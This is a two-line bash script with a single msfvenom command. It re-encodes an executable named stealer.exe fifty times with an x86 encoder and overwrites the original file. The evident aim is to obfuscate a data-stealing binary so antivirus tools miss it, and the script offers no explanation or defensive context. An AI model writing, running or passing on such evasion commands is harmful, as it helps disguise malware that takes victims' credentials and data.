#!/bin/bash
msfvenom -x stealer.exe -p generic/custom --arch x86 -e x86/jmp_call_additive -i 50 -f exe -o stealer.exe
